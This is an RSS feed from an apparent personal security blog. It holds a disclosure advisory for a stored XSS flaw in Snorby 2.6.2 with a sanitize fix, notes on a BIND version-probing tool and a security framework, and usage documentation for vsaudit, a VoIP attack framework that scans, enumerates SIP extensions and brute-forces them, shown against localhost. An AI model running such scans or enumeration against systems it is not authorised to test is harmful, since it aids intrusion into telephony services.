<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>DEFTCODE</title>
		<description>security.. coding / beer / coffee</description>
		<link>http://deftcode.ninja/</link>
		<atom:link href="http://deftcode.ninja/feed.xml" rel="self" type="application/rss+xml" />
		<pubDate>Mon, 29 May 2017 20:21:49 +0200</pubDate>
		<lastBuildDate>Mon, 29 May 2017 20:21:49 +0200</lastBuildDate>
		<generator>Jekyll v2.5.3</generator>
		
			<item>
				<title>CVE-2015-5460 – Snorby – 2.6.2 - Stored Cross-site Scripting</title>
				<description>&lt;h3 id=&quot;vendor&quot;&gt;Vendor&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.snorby.org/&quot; title=&quot;Snorby&quot;&gt;https://www.snorby.org/&lt;/a&gt; – &lt;strong&gt;2.6.2&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Snorby is a new and modern Snort IDS front-end. The basic fundamental concepts behind snorby are simplicity and power. The project goal is to create a free, open source and highly competitive application for network monitoring for both private and enterprise use.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;

&lt;p&gt;During my research and testing of new &lt;code&gt;IDS (Intrusion Detection System)&lt;/code&gt; like &lt;strong&gt;Suricata&lt;/strong&gt; I’ve found a &lt;code&gt;Stored Cross-site Scripting&lt;/code&gt; (XSS) vulnerability in &lt;strong&gt;Snorby&lt;/strong&gt; that I want to use as web user interface for suricata. The vulnerability exists in the module for adding a new threat classification model where the user input is not correctly sanitized before being saved it on the database or for example the output is not properly filtered, before its rendering in the &lt;strong&gt;event/menu&lt;/strong&gt; code, in this way the vector gets executed.&lt;/p&gt;

&lt;h3 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;CVSS Score&lt;/strong&gt;: 4.3 (&lt;a href=&quot;https://nvd.nist.gov/cvss.cfm?calculator&amp;amp;version=2&amp;amp;vector=(AV:N/AC:M/Au:N/C:N/I:P/A:N)&quot; title=&quot;CVSS v2 Vector (AV:N/AC:M/Au:N/C:N/I:P/A:N)&quot; target=&quot;_blank&quot;&gt;AV:N/AC:M/Au:N/C:N/I:P/A:N&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;XSS vector&lt;/code&gt; is triggered in the &lt;strong&gt;snorby/app/views/events/_menu.html.erb&lt;/strong&gt; page by the &lt;strong&gt;event/menu&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;% @classifications.each do |cls| %&amp;gt;
    &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;% if cls.locked &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cls.hotkey %&amp;gt;
        &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%= drop_down_item &amp;quot;#{cls.name}&lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;shortcut&amp;#39;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;#{cls.shortcut}&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;&amp;quot;, &amp;#39;#&amp;#39;, nil, { :class =&amp;gt; &amp;#39;classification&amp;#39;, :&amp;quot;data-classification-id&amp;quot; =&amp;gt; cls.id.to_i } %&amp;gt;
    &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;% else %&amp;gt;
        &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%= drop_down_item &amp;quot;#{cls.name}&amp;quot;, &amp;#39;#&amp;#39;, nil, { :class =&amp;gt; &amp;#39;classification&amp;#39;, :&amp;quot;data-classification-id&amp;quot; =&amp;gt; cls.id.to_i } %&amp;gt;
    &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;% end %&amp;gt;
&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;% end %&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;!--r34dm0r3--&gt;

&lt;h3 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h3&gt;

&lt;p&gt;A simple &lt;code&gt;XSS mitigation&lt;/code&gt; on rails could be the usage of the &lt;strong&gt;sanitize&lt;/strong&gt;, for example the code below filters the xss vector by removing the onerror attribute from the image tag:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;% @classifications.each do |cls| %
    &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;% if cls.locked &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cls.hotkey %&amp;gt;
        &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%= drop_down_item &amp;quot;#{sanitize cls.name}&lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;shortcut&amp;#39;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;#{cls.shortcut}&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;&amp;quot;, &amp;#39;#&amp;#39;, nil, { :class =&amp;gt; &amp;#39;classification&amp;#39;, :&amp;quot;data-classification-id&amp;quot; =&amp;gt; cls.id.to_i } %&amp;gt;
    &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;% else %&amp;gt;
        &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%= drop_down_item &amp;quot;#{sanitize cls.name}&amp;quot;, &amp;#39;#&amp;#39;, nil, { :class =&amp;gt; &amp;#39;classification&amp;#39;, :&amp;quot;data-classification-id&amp;quot; =&amp;gt; cls.id.to_i } %&amp;gt;
    &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;% end %&amp;gt;
&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;% end %&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; to the &lt;strong&gt;latest&lt;/strong&gt; version on &lt;a href=&quot;https://github.com/Snorby/snorby&quot; title=&quot;GitHub - Snorby&quot; target=&quot;_blank&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;disclosure&quot;&gt;Disclosure:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;30-06-2015&lt;/strong&gt; – Vendor notification (&lt;a href=&quot;https://github.com/Snorby/snorby/issues/377&quot; title=&quot;GitHub Issue-377&quot; target=&quot;_blank&quot;&gt;GitHub Issue-377&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;30-06-2015&lt;/strong&gt; – CVE id requested&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;01-07-2015&lt;/strong&gt; – Vendor acknowledge&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;01-07-2015&lt;/strong&gt; – Vendor pushed a fix (commit-id: &lt;a href=&quot;https://github.com/Snorby/snorby/commit/89d7cbcd3697c8a842f1a61b99e9a78f295798fb&quot; title=&quot;GitHub commit-id: 89d7cbcd3697c8a842f1a61b99e9a78f295798fb&quot; target=&quot;_blank&quot;&gt;89d7cbcd3697c8a842f1a61b99e9a78f295798fb&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;09-07-2015&lt;/strong&gt; – CVE id assigned (&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5460&quot; title=&quot;CVE-2015-5460&quot; target=&quot;_blank&quot;&gt;CVE-2015-5460&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;15-07-2015&lt;/strong&gt; – Public disclosure&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5460&quot; title=&quot;CVE-2015-5460&quot;&gt;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5460&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://seclists.org/fulldisclosure/2015/Jul/15&quot; title=&quot;FullDisclosure&quot;&gt;http://seclists.org/fulldisclosure/2015/Jul/15&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/Snorby/snorby/issues/377&quot; title=&quot;GitHub Issue-377&quot;&gt;https://github.com/Snorby/snorby/issues/377&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<pubDate>Wed, 15 Jul 2015 02:00:00 +0200</pubDate>
				<link>http://deftcode.ninja/post/CVE-2015-5460-snorby-ids-ui-stored-cross-site-scripting/</link>
				<guid isPermaLink="true">http://deftcode.ninja/post/CVE-2015-5460-snorby-ids-ui-stored-cross-site-scripting/</guid>
				
				
				<category>security</category>
				
				<category>cve</category>
				
			</item>
		
			<item>
				<title>Verbind – Discover fastly a remote bind version</title>
				<description>&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Verbind&lt;/strong&gt; is a &lt;code&gt;case-study tool&lt;/code&gt; to retrieve the &lt;code&gt;version&lt;/code&gt; of remote &lt;strong&gt;bind&lt;/strong&gt; service by executing a simple &lt;code&gt;dns query&lt;/code&gt; request by following the &lt;strong&gt;rfc&lt;/strong&gt; standard.&lt;/p&gt;

&lt;h3 id=&quot;howto&quot;&gt;Howto&lt;/h3&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;deftcode ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby verbind.rb deftcode.local
&amp;gt; Requesting &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; version.bind to address: deftcode.local
+ Bind version found: 9.8.4-rpz2+rl005.12-P1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;RFC-1035: &lt;a href=&quot;http://tools.ietf.org/html/rfc1035/&quot; title=&quot;RFC-1035&quot; target=&quot;_blank&quot;&gt;http://tools.ietf.org/html/rfc1035/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;DNS Protocol: &lt;a href=&quot;http://www.networksorcery.com/enp/protocol/dns.htm&quot; title=&quot;DNS Protocol&quot; target=&quot;_blank&quot;&gt;http://www.networksorcery.com/enp/protocol/dns.htm&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;source&quot;&gt;Source&lt;/h3&gt;

&lt;p&gt;&lt;span id=&quot;sources-list&quot;&gt;
&lt;a href=&quot;https://github.com/eurialo/verbind/&quot; title=&quot;Verbind GitHub&quot;&gt;View on GitHub&lt;/a&gt;
&lt;/span&gt;&lt;/p&gt;
</description>
				<pubDate>Sun, 24 May 2015 18:05:00 +0200</pubDate>
				<link>http://deftcode.ninja/post/verbind-discover-fastly-a-remote-bind-version/</link>
				<guid isPermaLink="true">http://deftcode.ninja/post/verbind-discover-fastly-a-remote-bind-version/</guid>
				
				
				<category>security</category>
				
				<category>coding</category>
				
			</item>
		
			<item>
				<title>Verbena – A lightweight security framework</title>
				<description>&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Verbena&lt;/strong&gt; is a &lt;strong&gt;lightweight&lt;/strong&gt; MVC based framework focused on &lt;strong&gt;security&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;It’s a flexible framework that allows you to fastly create secure applications, it can be extended without the complex user’s interactions.
The architecture is based on the famous pattern MVC (Model, View, Control) and all things are focused on the safety of the application itself.&lt;/p&gt;

&lt;p&gt;Verbena is an &lt;strong&gt;OSS&lt;/strong&gt; released under the &lt;strong&gt;MIT License&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Any kind of advice or contributions are welcome!&lt;/p&gt;

&lt;h3 id=&quot;howto&quot;&gt;Howto&lt;/h3&gt;

&lt;p&gt;Follow this link to see verbena in action: &lt;a href=&quot;http://verbena.deftcode.ninja/&quot; title=&quot;Verbena Reference&quot; target=&quot;_blank&quot;&gt;http://verbena.deftcode.ninja/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;contribution-and-bug-report&quot;&gt;Contribution and Bug report&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;If you want to contribute to the project, fork It and then contact me by email!&lt;/li&gt;
  &lt;li&gt;Report bugs at &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#101;&amp;#117;&amp;#114;&amp;#105;&amp;#097;&amp;#108;&amp;#111;&amp;#064;&amp;#100;&amp;#101;&amp;#102;&amp;#116;&amp;#099;&amp;#111;&amp;#100;&amp;#101;&amp;#046;&amp;#110;&amp;#105;&amp;#110;&amp;#106;&amp;#097;&quot;&gt;&amp;#101;&amp;#117;&amp;#114;&amp;#105;&amp;#097;&amp;#108;&amp;#111;&amp;#064;&amp;#100;&amp;#101;&amp;#102;&amp;#116;&amp;#099;&amp;#111;&amp;#100;&amp;#101;&amp;#046;&amp;#110;&amp;#105;&amp;#110;&amp;#106;&amp;#097;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;source&quot;&gt;Source&lt;/h3&gt;

&lt;p&gt;&lt;span id=&quot;sources-list&quot;&gt;
&lt;a href=&quot;https://github.com/eurialo/verbena/&quot; title=&quot;Verbena GitHub&quot;&gt;View on GitHub&lt;/a&gt;
&lt;/span&gt;&lt;/p&gt;
</description>
				<pubDate>Sun, 24 May 2015 17:30:00 +0200</pubDate>
				<link>http://deftcode.ninja/post/verbena-lightweight-security-framework/</link>
				<guid isPermaLink="true">http://deftcode.ninja/post/verbena-lightweight-security-framework/</guid>
				
				
				<category>security</category>
				
				<category>coding</category>
				
			</item>
		
			<item>
				<title>vsaudit - VOIP Security Audit Framework</title>
				<description>&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;

&lt;p&gt;The &lt;code&gt;vsaudit&lt;/code&gt; is an opensource framework to perform &lt;strong&gt;attacks&lt;/strong&gt; to general &lt;strong&gt;voip services&lt;/strong&gt;. It allows to &lt;strong&gt;scan&lt;/strong&gt; the whole network or single host engaging in the &lt;strong&gt;information gathering&lt;/strong&gt; phase, besides it is able to search for most known &lt;strong&gt;vulnerabilities&lt;/strong&gt; on the found alive hosts and then try to &lt;strong&gt;exploit&lt;/strong&gt; them.&lt;/p&gt;

&lt;h3 id=&quot;configuration&quot;&gt;Configuration&lt;/h3&gt;

&lt;p&gt;To start using vsaudit you must install the ‘bundler’ package that will be used to install
the requireds gem dependencies through the Gemfile.&lt;/p&gt;

&lt;p&gt;Download directly from the &lt;a href=&quot;http://bundler.io/&quot; title=&quot;Bundler&quot;&gt;Bundler&lt;/a&gt; website.&lt;/p&gt;

&lt;p&gt;Or install with ‘&lt;strong&gt;gem&lt;/strong&gt;’ (ruby package manager) with: &lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;deftcode ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gem install bundler&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;After that the installation has been completed, run (in the directory where is located vsaudit):&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;deftcode vsaudit &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bundle&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now you can start vsaudit with:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;deftcode vsaudit &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby vsaudit.rb&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;basic-usage&quot;&gt;Basic usage&lt;/h3&gt;

&lt;h4 id=&quot;environment-commands&quot;&gt;Environment commands&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Display the available options that can be set&lt;/li&gt;
  &lt;li&gt;List the environment variables&lt;/li&gt;
  &lt;li&gt;Get the value of environment variable&lt;/li&gt;
  &lt;li&gt;Set or change the environment variables&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;audit-commands&quot;&gt;Audit commands&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Check mistakes in the local configuration files&lt;/li&gt;
  &lt;li&gt;Scan a local o remote network&lt;/li&gt;
  &lt;li&gt;Enumerate the extensions&lt;/li&gt;
  &lt;li&gt;Bruteforce extensions&lt;/li&gt;
  &lt;li&gt;Get the live network traffic&lt;/li&gt;
  &lt;li&gt;Intercept the network traffic by custom bpf&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;informations-commands&quot;&gt;Informations commands&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Get informations about modules or address&lt;/li&gt;
  &lt;li&gt;Show the report list&lt;/li&gt;
  &lt;li&gt;Show the extensions list&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;global-commands&quot;&gt;Global commands&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Display the help message&lt;/li&gt;
  &lt;li&gt;Quit from the framework&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;environment-commands-1&quot;&gt;Environment commands&lt;/h3&gt;

&lt;h4 id=&quot;display-the-available-options-that-can-be-set&quot;&gt;Display the available options that can be set&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; help environment

+ ENVIRONMENT COMMANDS:

    Command     Args            Description
    s|set       [key] [value]   Set an environment variable
    g|get       [key]           Get an environment variable value/s
    e|env       -               Display all environment variables


+ ENVIRONMENT VARIABLES:

    Option      Value           Description
    PORT        [*r|5060]       Set port range (default: 5060)
    TIMEOUT     [1|0.5]         Set scanner timeout connect()/recv() (default: 1 seconds)
    THREADS     [1|200]         Set scanner threads limit (default: 50 concurrency)
    TRANSPORT   [udp|tcp]       Set transport for enumeration/bruteforce (default: udp)
    IFACE       [eth0|wlan1]    Indicate which interface use to capture network traffic (default: eth0)
    DUMPHEX     [on|off]        Dump network traffic in hexadecimal (default: off)
    DUMPCLEAN   [on|off]        Clear network traffic skipping unicode frame bytes (default: on)

    * r: range  ex. &#39;0-65535&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;list-the-environment-variables&quot;&gt;List the environment variables&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; env
-&amp;gt; DUMPCLEAN:   on
-&amp;gt; DUMPHEX:     off
-&amp;gt; IFACE:       any
-&amp;gt; PORT:        5060
-&amp;gt; THREADS:     50
-&amp;gt; TIMEOUT:     1
-&amp;gt; TRANSPORT:   udp
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;get-the-value-of-environment-variable&quot;&gt;Get the value of environment variable&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; get port
-&amp;gt; PORT: 5060
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;set-or-change-the-environment-variables&quot;&gt;Set or change the environment variables&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;vsaudit &amp;gt; set port 0-65535
+ setting key: PORT value: 0-65535&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;audit-commands-1&quot;&gt;Audit commands&lt;/h3&gt;

&lt;h4 id=&quot;check-mistakes-in-the-local-configuration-files&quot;&gt;Check mistakes in the local configuration files&lt;/h4&gt;

&lt;p&gt;In &lt;code&gt;modules/asterisk.rb&lt;/code&gt; you can &lt;strong&gt;set&lt;/strong&gt; the custom &lt;strong&gt;configuration files&lt;/strong&gt; that you &lt;strong&gt;want&lt;/strong&gt; vsaudit to &lt;strong&gt;inspect&lt;/strong&gt;
and &lt;strong&gt;search&lt;/strong&gt; for common &lt;strong&gt;mistakes&lt;/strong&gt; through a &lt;strong&gt;regular expressions patterns&lt;/strong&gt;. 
You could add or remove configuration files to array named &lt;code&gt;@@services_files&lt;/code&gt; with the regex pattern.&lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;@@services_files = [
    # file to audit.                    # unsecure parameter regex.
    &#39;/etc/asterisk/sip.conf&#39;            =&amp;gt; /^(allow=|allowguest)/,
    &#39;/etc/asterisk/extensions.conf&#39;     =&amp;gt; /^(allow)/
]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the example above you can &lt;strong&gt;set&lt;/strong&gt; the &lt;strong&gt;filename&lt;/strong&gt; with absolute path you want to &lt;strong&gt;inspect&lt;/strong&gt; and then you
must &lt;strong&gt;set&lt;/strong&gt; the &lt;strong&gt;regular expression&lt;/strong&gt; to &lt;strong&gt;match&lt;/strong&gt; in file, in this case you &lt;strong&gt;instruct vsaudit&lt;/strong&gt; to &lt;strong&gt;grep&lt;/strong&gt; the
&lt;code&gt;sip.conf&lt;/code&gt; and &lt;strong&gt;search&lt;/strong&gt; for configuration &lt;strong&gt;option&lt;/strong&gt; that start with &lt;code&gt;allow=&lt;/code&gt; or &lt;code&gt;allowguest&lt;/code&gt; and the
&lt;code&gt;extensions.conf&lt;/code&gt; for just &lt;code&gt;allow=&lt;/code&gt; options.&lt;/p&gt;

&lt;p&gt;How to use it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; fcheck

    Checking filename:  /etc/asterisk/sip.conf
    regexp to matchs:   (?-mix:^(allow=|allowguest))

    Line 3: un-safe parameter found &#39;allowguest=no&#39;
    Line 9: un-safe parameter found &#39;allow=ulaw&#39;

    Checking filename:  /etc/asterisk/extensions.conf
    regexp to matchs:   (?-mix:^(allow))
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;scan-a-local-o-remote-network&quot;&gt;Scan a local o remote network&lt;/h4&gt;

&lt;p&gt;You can &lt;strong&gt;perform&lt;/strong&gt; a &lt;strong&gt;port-scan&lt;/strong&gt; with &lt;strong&gt;TCP/UDP transport&lt;/strong&gt; by &lt;strong&gt;matching&lt;/strong&gt; vulnerables &lt;strong&gt;services&lt;/strong&gt; with a custom
&lt;strong&gt;regular expression&lt;/strong&gt; set in the &lt;code&gt;modules/asterisk.rb&lt;/code&gt; module.
In the module you can see the &lt;code&gt;@@services_udp_detect_regex&lt;/code&gt; &lt;strong&gt;variable&lt;/strong&gt; that &lt;strong&gt;allows&lt;/strong&gt; you to &lt;strong&gt;set&lt;/strong&gt; the
&lt;strong&gt;regular expression&lt;/strong&gt; that will be used next time to &lt;strong&gt;match&lt;/strong&gt; the &lt;strong&gt;service banner&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; these things are the same for TCP transport, but you must use the ‘@@services_tcp_detect_regex’
variable for regular expressions settings.&lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;@@services_udp_detect_regex = [
    :identifiers    =&amp;gt; /(Server:|User-Agent:)/,
    :methods        =&amp;gt; /Allow:/
]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the example above you can set the &lt;strong&gt;identifiers&lt;/strong&gt; and &lt;strong&gt;methods&lt;/strong&gt;, the &lt;strong&gt;first&lt;/strong&gt; is used to &lt;strong&gt;match&lt;/strong&gt;
the &lt;strong&gt;service banner&lt;/strong&gt;, instead the &lt;strong&gt;last&lt;/strong&gt; is used to &lt;strong&gt;match&lt;/strong&gt; the available &lt;strong&gt;public methods enabled&lt;/strong&gt; in
the service (this is usually referred to Asterisk daemon).&lt;/p&gt;

&lt;p&gt;While port-scanning, &lt;strong&gt;vsaudit grep&lt;/strong&gt; the service &lt;strong&gt;response&lt;/strong&gt; and search for &lt;strong&gt;identifiers&lt;/strong&gt; regular
expression, then it checks for allowed methods.&lt;/p&gt;

&lt;p&gt;How to use it:&lt;/p&gt;

&lt;p&gt;First set port range, this can be a single port or ports range (default: 5060):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; set port 5060                 # Scans single port
or
vsaudit &amp;gt; set port 5000-8000            # Scans from port 5000 to 8000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Optionally you can set the transport (default is set to udp)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; set transport tcp             # Sets transport to tcp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Optionally you can set the timeout value for connect() and recv() calls (default: 0.5):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; set timeout 1                 # Sets timeout to 1 seconds
or
vsaudit &amp;gt; set timeout 0.5               # Sets timeout to 0.5 seconds (500 milliseconds)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Do the network scan:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; scan 127.0.0.1

starting scan on address:   127.0.0.1
using ports-range:          5060-5060 (udp)

+ 127.0.0.1        open port udp/5060            Asterisk PBX 11.7.0~dfsg-1ubuntu1


----------------------------------------------------------------------------------------------------------------------
| Device           | Port      | Banner                                   | Allows                                   |
----------------------------------------------------------------------------------------------------------------------
| 127.0.0.1        | 5060/udp  | Asterisk PBX 11.7.0~dfsg-1ubuntu1        | INVITE, ACK, CANCEL, OPTIONS, BYE        |
----------------------------------------------------------------------------------------------------------------------
+ Consider to use: i [device] to retrieve full device informations
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;enumerate-the-extensions&quot;&gt;Enumerate the extensions&lt;/h4&gt;

&lt;p&gt;You can starts &lt;strong&gt;enumerating&lt;/strong&gt; the &lt;strong&gt;extensions&lt;/strong&gt; with explicit &lt;strong&gt;set&lt;/strong&gt; a custom &lt;strong&gt;address&lt;/strong&gt; or 
&lt;strong&gt;using&lt;/strong&gt; the &lt;strong&gt;previous addresses found&lt;/strong&gt; through &lt;strong&gt;port-scanner&lt;/strong&gt;, then you can &lt;strong&gt;specify&lt;/strong&gt; the &lt;strong&gt;extensions range&lt;/strong&gt;
or the &lt;strong&gt;file&lt;/strong&gt; that can be &lt;strong&gt;used&lt;/strong&gt; to &lt;strong&gt;enumerate&lt;/strong&gt; it.&lt;/p&gt;

&lt;p&gt;How to use it:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Enumerating&lt;/strong&gt; using &lt;strong&gt;single target&lt;/strong&gt; and &lt;strong&gt;custom ranges&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; en 7000-8000 127.0.0.1

    starting enumeration on address:    127.0.0.1
    using ports-range:                  5060-5060 (udp)

    + 127.0.0.1:5060         extension &#39;7002&#39; enabled   [no auth]
    + 127.0.0.1:5060         extension &#39;7003&#39; enabled   [no auth]
    &amp;gt; testing extension: 8000                  

    ------------------------------------------------------------------------------------
    | Device           | Port      | Extension           | Auth | Password             |
    ------------------------------------------------------------------------------------
    | 127.0.0.1        | 5060/udp  | 7002                | no   | -                    |
    ------------------------------------------------------------------------------------
    | 127.0.0.1        | 5060/udp  | 7003                | no   | -                    |
    ------------------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Enumerating&lt;/strong&gt; using &lt;strong&gt;previous generated report&lt;/strong&gt; list and &lt;strong&gt;custom range&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; r

    ----------------------------------------------------------------------------------------------------------------------
    | Device           | Port      | Motd                                     | Allows                                   |
    ----------------------------------------------------------------------------------------------------------------------
    | 127.0.0.1        | 5060/udp  | Asterisk PBX 11.7.0~dfsg-1ubuntu1        | INVITE, ACK, CANCEL, OPTIONS, BYE        |
    ----------------------------------------------------------------------------------------------------------------------

vsaudit &amp;gt; en 7000-8000

    starting enumeration on address:    127.0.0.1
    using single port:                  5060 (udp)

    + 127.0.0.1:5060         extension &#39;7002&#39; enabled   [no auth]
    + 127.0.0.1:5060         extension &#39;7003&#39; enabled   [no auth]
    &amp;gt; testing extension: 8000

    ------------------------------------------------------------------------------------
    | Device           | Port      | Extension           | Auth | Password             |
    ------------------------------------------------------------------------------------
    | 127.0.0.1        | 5060/udp  | 7002                | no   | -                    |
    ------------------------------------------------------------------------------------
